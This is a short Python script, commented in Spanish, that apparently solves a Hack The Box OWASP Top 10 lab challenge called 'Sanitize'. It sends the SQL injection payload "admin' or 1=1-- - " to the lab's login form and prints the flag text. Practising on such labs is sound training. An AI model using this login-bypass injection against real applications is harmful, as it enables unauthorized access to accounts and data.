#!/usr/bin/python3

# Reto Sanitice HTB del Track Owasp Top 10
# Automatizacion de la injeccion via SQL muy easy ' or 1=1-- -

import signal
import sys
import requests
import pdb
import time

from pwn import *

def bacon(sig, frame):
	print("\n[*] Saliendo...\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, bacon)

# Variables Globales
main_url = "http://64.227.39.89:30501/"  # Modifica esto

def execSQLI():

	p1 = log.progress("Explotando Panel de Authentication")

	post_data = {

	'username': "admin' or 1=1-- - ",
	'password': 'pass'
	}

	r = requests.post(main_url, data=post_data)

	data = r.text
	data = data.split('"slogan"><span>')[-1]
	data = data.split('</span></p>')[0]
	time.sleep(3)
	print(data.strip())

if __name__ == '__main__':

	execSQLI()
